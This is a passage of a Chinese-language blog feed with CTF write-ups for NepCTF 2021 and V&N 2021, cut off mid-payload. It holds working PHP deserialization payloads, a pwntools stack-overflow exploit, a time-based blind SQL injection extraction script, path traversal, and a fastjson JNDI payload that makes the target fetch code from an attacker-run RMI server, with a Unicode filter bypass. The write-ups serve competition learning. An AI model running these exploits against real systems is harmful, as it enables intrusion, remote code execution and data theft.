punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>成功删除waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="读取flag："><a href="#读取flag：" class="headerlink" title="读取flag："></a>读取flag：</h5><p>ls没过滤，有兴趣可以执行ls看一眼，flag在根目录下</p><p>最后一步，分析shell.php，如何在过滤的情况下读取/flag，搜一圈，找到了linux的命令<code>pr</code></p><blockquote><p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'  类同上  '</span><span class="token single-quoted-string string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>拿到flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>记录一下，获取类函数名的方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token single-quoted-string string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__call'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token single-quoted-string string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>反编译出c#代码</p><p>写exp：</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">λ python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>Aes加密网站一波：</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有收获，尤其是《简单的php反序列化》，又学到一个新姿势。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;队伍名称：Err0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N2021公开赛</title>
    <link href="https://err0r.top/article/VN2021ctf/"/>
    <id>https://err0r.top/article/VN2021ctf/</id>
    <published>2021-03-15T04:17:51.000Z</published>
    <updated>2021-03-30T11:45:23.761Z</updated>
    
    <content type="html"><![CDATA[<p>比赛昵称：别答了别答了再答人傻了</p><a id="more"></a><p>比赛情况：</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>孩子太菜了，后面实在不会做了…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>直接从第十关开始，上去撸boss，出flag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p><p>再冷静下测试一下，确认是sql注入</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错username&#x3D;\&amp;password&#x3D;&#39; ·报错username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错username&#x3D;\&amp;password&#x3D;&#39;# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时发现没啥用...</code></pre><p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>过滤了sleep()可能</p><p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p><h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p><blockquote><p>笛卡尔积延时注入</p><p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p><p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>甚至数量大了把我数据库给跑崩了…</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>孩子实在跑不下去了</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>登录成功</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>js加载图片</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>抓包看</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>结合应该是fastjson反序列化漏洞</p><h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p><p>服务器起 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>再起监听端口</p><p>最后打payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token 